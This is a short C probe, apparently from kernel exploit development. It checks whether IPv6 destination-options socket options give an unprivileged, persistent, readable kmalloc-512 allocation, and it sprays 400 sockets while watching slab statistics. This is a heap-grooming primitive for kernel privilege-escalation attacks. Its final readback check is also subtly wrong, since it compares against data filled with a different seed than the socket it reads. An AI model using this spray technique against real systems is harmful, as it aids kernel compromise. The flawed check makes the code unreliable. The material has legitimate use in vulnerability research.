/* Standalone guest probe: does setsockopt(IPV6_DSTOPTS) with hdrlen=55
 * allocate a persistent, readable kmalloc-512 object?
 * Build: zig cc -D_GNU_SOURCE -target aarch64-linux-musl -static -O2
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>

#ifndef IPV6_DSTOPTS
#define IPV6_DSTOPTS 59
#endif

static int dump_slab(const char *tag)
{
	FILE *f = fopen("/proc/slabinfo", "r");
	char line[512];
	int shown = 0;

	if (!f) {
		printf("[probe] slabinfo open errno=%d\n", errno);
		return -1;
	}
	while (fgets(line, sizeof(line), f)) {
		if (strstr(line, "kmalloc-512") ||
		    strstr(line, "kmalloc-cg-512") ||
		    strstr(line, "kmalloc-1k")) {
			printf("[probe] %s %s", tag, line);
			shown++;
		}
	}
	fclose(f);
	return shown;
}

static void dump_sysfs(const char *p)
{
	char buf[64];
	int fd = open(p, O_RDONLY);
	ssize_t n;

	if (fd < 0) {
		printf("[probe] %s: open errno=%d\n", p, errno);
		return;
	}
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n < 0) {
		printf("[probe] %s: read errno=%d\n", p, errno);
		return;
	}
	buf[n] = 0;
	while (n && (buf[n - 1] == '\n' || buf[n - 1] == ' '))
		buf[--n] = 0;
	printf("[probe] %s = %s\n", p, buf);
}

#define OPT_LEN 448
#define HDRLEN  ((OPT_LEN / 8) - 1)	/* 55 -> ipv6_optlen == 448 */

static void fill(unsigned char *b, unsigned int seed)
{
	unsigned int i;

	memset(b, 0, OPT_LEN);
	b[0] = 59;		/* next header: IPPROTO_NONE */
	b[1] = HDRLEN;
	for (i = 2; i < OPT_LEN; i++)
		b[i] = (unsigned char)(seed + i);
}

static int one_round(const char *tag, unsigned int seed)
{
	unsigned char in[OPT_LEN], out[OPT_LEN];
	int fd, len = OPT_LEN, rc;

	fd = socket(AF_INET6, SOCK_DGRAM, 0);
	if (fd < 0) {
		printf("[probe] %s socket errno=%d (%s)\n", tag, errno,
		       strerror(errno));
		return -1;
	}
	fill(in, seed);
	rc = setsockopt(fd, IPPROTO_IPV6, IPV6_DSTOPTS, in, OPT_LEN);
	printf("[probe] %s setsockopt rc=%d errno=%d (%s)\n", tag, rc, errno,
	       strerror(errno));
	if (rc) {
		close(fd);
		return -1;
	}
	memset(out, 0xcc, sizeof(out));
	rc = getsockopt(fd, IPPROTO_IPV6, IPV6_DSTOPTS, out, (socklen_t *)&len);
	printf("[probe] %s getsockopt rc=%d errno=%d len=%d match=%d\n",
	       tag, rc, errno, len, memcmp(in, out, OPT_LEN) == 0);
	printf("[probe] %s out[0..7]=%02x %02x %02x %02x %02x %02x %02x %02x\n",
	       tag, out[0], out[1], out[2], out[3], out[4], out[5], out[6],
	       out[7]);
	close(fd);
	return 0;
}

int main(void)
{
	static int fds[400];
	unsigned char in[OPT_LEN], out[OPT_LEN];
	int i, ok = 0, len;

	dump_sysfs("/sys/kernel/slab/kmalloc-512/order");
	dump_sysfs("/sys/kernel/slab/kmalloc-512/object_size");
	dump_sysfs("/sys/kernel/slab/kmalloc-512/objs_per_slab");
	dump_sysfs("/sys/kernel/slab/kmalloc-cg-512/order");
	dump_sysfs("/sys/kernel/slab/kmalloc-cg-512/object_size");

	dump_slab("pre");
	if (one_round("single", 7))
		return 1;

	dump_slab("pre-spray");
	for (i = 0; i < 400; i++) {
		fds[i] = socket(AF_INET6, SOCK_DGRAM, 0);
		if (fds[i] < 0)
			break;
		fill(in, (unsigned int)i);
		if (setsockopt(fds[i], IPPROTO_IPV6, IPV6_DSTOPTS, in,
			       OPT_LEN)) {
			printf("[probe] setsockopt i=%d errno=%d\n", i, errno);
			break;
		}
	}
	printf("[probe] sprayed sockets=%d\n", i);
	dump_slab("post-spray");

	/* read one back */
	len = OPT_LEN;
	fill(in, 123);
	if (i > 0 &&
	    !getsockopt(fds[i / 2], IPPROTO_IPV6, IPV6_DSTOPTS, out,
			(socklen_t *)&len) && !memcmp(in, out, OPT_LEN))
		ok = 1;
	printf("[probe] readback mid match=%d len=%d\n", ok, len);
	(void)ok;

	/* drop privileges and repeat once (no capable() should be needed) */
	if (setgid(1000) || setuid(1000))
		printf("[probe] setuid failed errno=%d\n", errno);
	else
		printf("[probe] uid now %d\n", (int)getuid());
	one_round("as-uid1000", 9);
	return 0;
}
